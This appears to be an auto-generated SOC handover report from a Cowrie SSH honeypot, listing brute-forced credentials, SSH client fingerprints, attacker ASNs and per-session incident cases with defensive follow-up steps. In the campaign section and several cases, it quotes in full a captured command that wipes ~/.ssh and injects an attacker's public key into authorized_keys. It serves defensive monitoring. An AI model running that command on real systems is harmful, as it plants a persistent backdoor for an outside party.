# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-13 |
| **Generated At** | 2026-11-13T04:02:41Z |
| **Shift Time** | 04:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **110** |
| Confirmed Threats | **88** |
| False Positives Filtered | **22** (20.0%) |
| Unique Attacker IPs | **89** |
| Countries of Origin | **34** |
| High Severity Cases | **54** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **56** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **158** |
| Unique Credential Pairs | **50** |
| Unique Usernames | **22** |
| Unique Passwords | **46** |
| Successful Auth Pairs | **90** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 54 |
| `rootssssss23424123123` | 20 |
| `support` | 13 |
| `admin` | 11 |
| `345gs5662d34` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `rootssssss23424123123` | 20 |
| `root3245gs5662d34111111111` | 20 |
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `admin` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 20 |
| `root` | `root3245gs5662d34111111111` | 18 |
| `345gs5662d34` | `345gs5662d34` | 7 |
| `dixell` | `dixell` | 5 |
| `support` | `12341234` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `guest` | `guest77` | `80.223.198.246` | 2026-11-13T00:06:11 |
| `guest` | `guest77` | `119.204.122.94` | 2026-11-13T00:06:21 |
| `root` | `Oracle2024` | `69.6.207.8` | 2026-11-13T00:08:07 |
| `rootssssss23424123123` | `rootssssss23424123123` | `69.6.207.8` | 2026-11-13T00:08:08 |
| `root` | `root3245gs5662d34111111111` | `69.6.207.8` | 2026-11-13T00:08:12 |
| `admin` | `1qaz@WSX` | `45.238.2.67` | 2026-11-13T00:08:26 |
| `admin` | `admin` | `195.178.110.78` | 2026-11-13T00:08:59 |
| `admin` | `1qaz@WSX` | `186.239.41.74` | 2026-11-13T00:10:13 |
| `dixell` | `dixell` | `183.104.220.152` | 2026-11-13T00:14:22 |
| `blank` | `blank13` | `10.0.0.73` | 2026-11-13T00:14:23 |
| `support` | `12341234` | `203.198.129.123` | 2026-11-13T00:16:38 |
| `support` | `12341234` | `124.105.218.147` | 2026-11-13T00:16:48 |
| `root` | `123456@abc` | `10.0.0.73` | 2026-11-13T00:22:03 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-11-13T00:22:07 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-11-13T00:22:08 |
| `test01` | `test01` | `10.0.0.73` | 2026-11-13T00:26:20 |
| `test01` | `3245gs5662d34` | `10.0.0.73` | 2026-11-13T00:26:26 |
| `root` | `qq@123456` | `186.209.77.236` | 2026-11-13T00:34:18 |
| `rootssssss23424123123` | `rootssssss23424123123` | `186.209.77.236` | 2026-11-13T00:34:21 |
| `root` | `root3245gs5662d34111111111` | `186.209.77.236` | 2026-11-13T00:34:25 |
_… 70 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **110** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 35 |
| libssh | 14 |
| Go SSH scanner | 13 |
| Perl Net::SSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 28 | 28 |
| `f555226df196...` | Mirai/variant | 14 | 8 |
| `7d01d047ace6...` | Mirai/variant | 4 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 28 | 28 | Mirai/variant |
| `f555226df196...` | libssh | 14 | 8 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 7 | 7 | — |
| `7d01d047ace6...` | Go SSH scanner | 4 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `119.246.15.94`, `69.6.207.8`, `129.121.138.109`, `186.209.77.236`, `197.221.232.44`, `103.107.143.82`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **89** |
| Unique ASNs | **50** |
| High-Risk ASNs | **46** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 22 | HIGH |
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS213412` | ONYPHE SAS | 5 | LOW |
| `AS10429` | TELEFÔNICA BRASIL S.A | 3 | HIGH |
| `AS51995` | Toroptsev Igor | 3 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 3 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (50)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c0e90426197d

| Field | Detail |
|---|---|
| **Source IP** | `80.223.198[.]246` |
| **First Seen** | 2026-11-13 00:06 |
| **Last Seen** | 2026-11-13 00:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:06:09` | `cowrie.session.connect` |
| `2026-11-13 00:06:10` | `cowrie.client.version` |
| `2026-11-13 00:06:10` | `cowrie.client.kex` |
| `2026-11-13 00:06:11` | `cowrie.login.success` |
| `2026-11-13 00:06:12` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.223.198[.]246` to AbuseIPDB if not already reported
- [ ] Block `80.223.198[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f65d5931a9b

| Field | Detail |
|---|---|
| **Source IP** | `119.204.122[.]94` |
| **First Seen** | 2026-11-13 00:06 |
| **Last Seen** | 2026-11-13 00:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:06:18` | `cowrie.session.connect` |
| `2026-11-13 00:06:19` | `cowrie.client.version` |
| `2026-11-13 00:06:19` | `cowrie.client.kex` |
| `2026-11-13 00:06:21` | `cowrie.login.success` |
| `2026-11-13 00:06:22` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.204.122[.]94` to AbuseIPDB if not already reported
- [ ] Block `119.204.122[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f325ee3b9e4

| Field | Detail |
|---|---|
| **Source IP** | `69.6.207[.]8` |
| **First Seen** | 2026-11-13 00:08 |
| **Last Seen** | 2026-11-13 00:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:08:06` | `cowrie.session.connect` |
| `2026-11-13 00:08:06` | `cowrie.client.version` |
| `2026-11-13 00:08:06` | `cowrie.client.kex` |
| `2026-11-13 00:08:07` | `cowrie.login.success` |
| `2026-11-13 00:08:07` | `cowrie.session.params` |
| `2026-11-13 00:08:07` | `cowrie.command.input` |
| `2026-11-13 00:08:07` | `cowrie.command.failed` |
| `2026-11-13 00:08:07` | `cowrie.log.closed` |
| `2026-11-13 00:08:08` | `cowrie.session.params` |
| `2026-11-13 00:08:08` | `cowrie.command.input` |
| `2026-11-13 00:08:08` | `cowrie.session.file_download` |
| `2026-11-13 00:08:08` | `cowrie.log.closed` |
| `2026-11-13 00:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.207[.]8` to AbuseIPDB if not already reported
- [ ] Block `69.6.207[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17e63bc0ff08

| Field | Detail |
|---|---|
| **Source IP** | `69.6.207[.]8` |
| **First Seen** | 2026-11-13 00:08 |
| **Last Seen** | 2026-11-13 00:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:08:08` | `cowrie.session.connect` |
| `2026-11-13 00:08:08` | `cowrie.client.version` |
| `2026-11-13 00:08:08` | `cowrie.client.kex` |
| `2026-11-13 00:08:08` | `cowrie.login.success` |
| `2026-11-13 00:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.207[.]8` to AbuseIPDB if not already reported
- [ ] Block `69.6.207[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2329623d66f6

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-11-13 00:08 |
| **Last Seen** | 2026-11-13 00:10 |
| **Session Duration** | 121s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:08:14` | `cowrie.session.connect` |
| `2026-11-13 00:08:16` | `cowrie.client.version` |
| `2026-11-13 00:08:16` | `cowrie.client.kex` |
| `2026-11-13 00:10:13` | `cowrie.login.success` |
| `2026-11-13 00:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab3d16c0a61

| Field | Detail |
|---|---|
| **Source IP** | `45.238.2[.]67` |
| **First Seen** | 2026-11-13 00:08 |
| **Last Seen** | 2026-11-13 00:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:08:24` | `cowrie.session.connect` |
| `2026-11-13 00:08:24` | `cowrie.client.version` |
| `2026-11-13 00:08:24` | `cowrie.client.kex` |
| `2026-11-13 00:08:26` | `cowrie.login.success` |
| `2026-11-13 00:08:27` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.238.2[.]67` to AbuseIPDB if not already reported
- [ ] Block `45.238.2[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc4bea305918

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-13 00:08 |
| **Last Seen** | 2026-11-13 00:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:08:59` | `cowrie.session.connect` |
| `2026-11-13 00:08:59` | `cowrie.login.success` |
| `2026-11-13 00:09:00` | `cowrie.session.params` |
| `2026-11-13 00:09:00` | `cowrie.log.closed` |
| `2026-11-13 00:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68eea96910a2

| Field | Detail |
|---|---|
| **Source IP** | `183.104.220[.]152` |
| **First Seen** | 2026-11-13 00:14 |
| **Last Seen** | 2026-11-13 00:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:14:20` | `cowrie.session.connect` |
| `2026-11-13 00:14:20` | `cowrie.client.version` |
| `2026-11-13 00:14:20` | `cowrie.client.kex` |
| `2026-11-13 00:14:22` | `cowrie.login.success` |
| `2026-11-13 00:14:23` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.104.220[.]152` to AbuseIPDB if not already reported
- [ ] Block `183.104.220[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4963ef393280

| Field | Detail |
|---|---|
| **Source IP** | `203.198.129[.]123` |
| **First Seen** | 2026-11-13 00:16 |
| **Last Seen** | 2026-11-13 00:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:16:34` | `cowrie.session.connect` |
| `2026-11-13 00:16:35` | `cowrie.client.version` |
| `2026-11-13 00:16:35` | `cowrie.client.kex` |
| `2026-11-13 00:16:38` | `cowrie.login.success` |
| `2026-11-13 00:16:39` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.129[.]123` to AbuseIPDB if not already reported
- [ ] Block `203.198.129[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdce5fa27749

| Field | Detail |
|---|---|
| **Source IP** | `124.105.218[.]147` |
| **First Seen** | 2026-11-13 00:16 |
| **Last Seen** | 2026-11-13 00:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:16:45` | `cowrie.session.connect` |
| `2026-11-13 00:16:46` | `cowrie.client.version` |
| `2026-11-13 00:16:46` | `cowrie.client.kex` |
| `2026-11-13 00:16:48` | `cowrie.login.success` |
| `2026-11-13 00:16:49` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.105.218[.]147` to AbuseIPDB if not already reported
- [ ] Block `124.105.218[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c82eb4dfbb5e

| Field | Detail |
|---|---|
| **Source IP** | `186.209.77[.]236` |
| **First Seen** | 2026-11-13 00:34 |
| **Last Seen** | 2026-11-13 00:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:34:17` | `cowrie.session.connect` |
| `2026-11-13 00:34:17` | `cowrie.client.version` |
| `2026-11-13 00:34:17` | `cowrie.client.kex` |
| `2026-11-13 00:34:18` | `cowrie.login.success` |
| `2026-11-13 00:34:19` | `cowrie.session.params` |
| `2026-11-13 00:34:19` | `cowrie.command.input` |
| `2026-11-13 00:34:19` | `cowrie.command.failed` |
| `2026-11-13 00:34:19` | `cowrie.log.closed` |
| `2026-11-13 00:34:20` | `cowrie.session.params` |
| `2026-11-13 00:34:20` | `cowrie.command.input` |
| `2026-11-13 00:34:20` | `cowrie.session.file_download` |
| `2026-11-13 00:34:20` | `cowrie.log.closed` |
| `2026-11-13 00:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.209.77[.]236` to AbuseIPDB if not already reported
- [ ] Block `186.209.77[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76f99c9ccf20

| Field | Detail |
|---|---|
| **Source IP** | `186.209.77[.]236` |
| **First Seen** | 2026-11-13 00:34 |
| **Last Seen** | 2026-11-13 00:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:34:20` | `cowrie.session.connect` |
| `2026-11-13 00:34:20` | `cowrie.client.version` |
| `2026-11-13 00:34:20` | `cowrie.client.kex` |
| `2026-11-13 00:34:21` | `cowrie.login.success` |
| `2026-11-13 00:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.209.77[.]236` to AbuseIPDB if not already reported
- [ ] Block `186.209.77[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f645a94dfeb6

| Field | Detail |
|---|---|
| **Source IP** | `121.165.8[.]169` |
| **First Seen** | 2026-11-13 00:47 |
| **Last Seen** | 2026-11-13 00:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:47:29` | `cowrie.session.connect` |
| `2026-11-13 00:47:30` | `cowrie.client.version` |
| `2026-11-13 00:47:30` | `cowrie.client.kex` |
| `2026-11-13 00:47:33` | `cowrie.login.success` |
| `2026-11-13 00:47:34` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.165.8[.]169` to AbuseIPDB if not already reported
- [ ] Block `121.165.8[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf5994578d10

| Field | Detail |
|---|---|
| **Source IP** | `68.225.62[.]216` |
| **First Seen** | 2026-11-13 00:47 |
| **Last Seen** | 2026-11-13 00:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:47:39` | `cowrie.session.connect` |
| `2026-11-13 00:47:40` | `cowrie.client.version` |
| `2026-11-13 00:47:40` | `cowrie.client.kex` |
| `2026-11-13 00:47:41` | `cowrie.login.success` |
| `2026-11-13 00:47:42` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.225.62[.]216` to AbuseIPDB if not already reported
- [ ] Block `68.225.62[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1899ab3a65

| Field | Detail |
|---|---|
| **Source IP** | `120.141.22[.]254` |
| **First Seen** | 2026-11-13 00:58 |
| **Last Seen** | 2026-11-13 00:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 00:58:20` | `cowrie.session.connect` |
| `2026-11-13 00:58:21` | `cowrie.client.version` |
| `2026-11-13 00:58:21` | `cowrie.client.kex` |
| `2026-11-13 00:58:24` | `cowrie.login.success` |
| `2026-11-13 00:58:25` | `cowrie.direct-tcpip.request` |
| `2026-11-13 00:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.141.22[.]254` to AbuseIPDB if not already reported
- [ ] Block `120.141.22[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45715d80973a

| Field | Detail |
|---|---|
| **Source IP** | `187.50.226[.]182` |
| **First Seen** | 2026-11-13 01:18 |
| **Last Seen** | 2026-11-13 01:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:18:38` | `cowrie.session.connect` |
| `2026-11-13 01:18:39` | `cowrie.client.version` |
| `2026-11-13 01:18:39` | `cowrie.client.kex` |
| `2026-11-13 01:18:42` | `cowrie.login.success` |
| `2026-11-13 01:18:43` | `cowrie.direct-tcpip.request` |
| `2026-11-13 01:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.50.226[.]182` to AbuseIPDB if not already reported
- [ ] Block `187.50.226[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d527c077da

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]29` |
| **First Seen** | 2026-11-13 01:23 |
| **Last Seen** | 2026-11-13 01:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:23:35` | `cowrie.session.connect` |
| `2026-11-13 01:23:35` | `cowrie.client.version` |
| `2026-11-13 01:23:35` | `cowrie.client.kex` |
| `2026-11-13 01:23:36` | `cowrie.login.success` |
| `2026-11-13 01:23:36` | `cowrie.direct-tcpip.request` |
| `2026-11-13 01:23:36` | `cowrie.direct-tcpip.ja4` |
| `2026-11-13 01:23:36` | `cowrie.direct-tcpip.data` |
| `2026-11-13 01:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ce2e880470

| Field | Detail |
|---|---|
| **Source IP** | `91.186.216[.]80` |
| **First Seen** | 2026-11-13 01:23 |
| **Last Seen** | 2026-11-13 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 01:23:47` | `cowrie.session.connect` |
| `2026-11-13 01:23:47` | `cowrie.login.success` |
| `2026-11-13 01:23:48` | `cowrie.session.params` |
| `2026-11-13 01:23:48` | `cowrie.command.input` |
| `2026-11-13 01:23:49` | `cowrie.log.closed` |
| `2026-11-13 01:23:49` | `cowrie.session.closed` |

